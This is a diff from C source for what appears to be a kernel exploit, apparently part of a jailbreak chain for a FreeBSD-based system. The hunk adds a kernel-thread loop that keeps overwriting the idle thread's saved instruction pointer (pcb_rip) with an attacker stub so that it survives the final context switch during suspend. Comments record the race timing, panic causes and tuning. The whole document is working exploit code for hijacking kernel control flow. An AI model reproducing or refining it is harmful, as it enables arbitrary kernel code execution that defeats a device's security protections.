@@ -554,16 +554,40 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
     out32[1] = 0x0001;
 
     /*
-     * v4: No persistence loop in kernel. The tight kernel loop caused panics
-     * by monopolizing a CPU core and creating constant cache line contention
-     * with cpu_switch. Instead, kldload hammers pcb_rip from userspace via
-     * kekcall_copyin with usleep between writes. This naturally yields the
-     * CPU and avoids kernel-level contention.
+     * GENTLE PERSISTENCE LOOP: re-overwrite pcb_rip to race cpu_switch.
      *
-     * The kernel thread's job is done: stub is built, pcb_rip has been
-     * overwritten once (may be overwritten back by cpu_switch shortly),
-     * and all addresses are recorded in the output buffer for kldload.
+     * This loop runs AFTER output is signaled complete (out32[1] = 1), so
+     * kldload can read results immediately while we keep pcb_rip armed.
+     *
+     * v4 key insight: the ORIGINAL tight loop (200M writes/sec) caused
+     * kernel panics through cache line contention with cpu_switch.
+     * A USERSPACE loop (via kekcall_copyin) was stable but too slow —
+     * userspace threads are stopped before the kernel's final cpu_switch
+     * during suspend, so pcb_rip always reverted to sw_return.
+     *
+     * Solution: kernel-side loop with pause instructions. ~200K writes/sec
+     * (1000x slower than original). Each iteration:
+     *   - 1 write to pcb_rip (~1μs)
+     *   - 100 pause instructions (~5μs yield)
+     * Total: ~6μs per iteration, ~170K writes/sec.
+     *
+     * As a kproc (kernel thread), this loop survives longer during the
+     * suspend sequence than userspace threads, giving it a chance to
+     * write pcb_rip AFTER the final cpu_switch save.
+     *
+     * The gated stub (gate=0 during loop) ensures that if the idle thread
+     * executes the stub during normal operation, it's a safe nop.
+     *
+     * Loop runs for ~10 minutes. The CPU halt from standby stops it.
      */
+    if (!dry_run && idle_pcb >= MIN_KERN_ADDR) {
+        volatile uint64_t* pcb_rip_ptr = (volatile uint64_t*)(idle_pcb + PCB_RIP);
+        for (volatile uint64_t j = 0; j < 100000000ULL; j++) {
+            *pcb_rip_ptr = stub_addr;
+            for (volatile int k = 0; k < 100; k++)
+                __asm__ volatile("pause");
+        }
+    }
 }
 
 static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
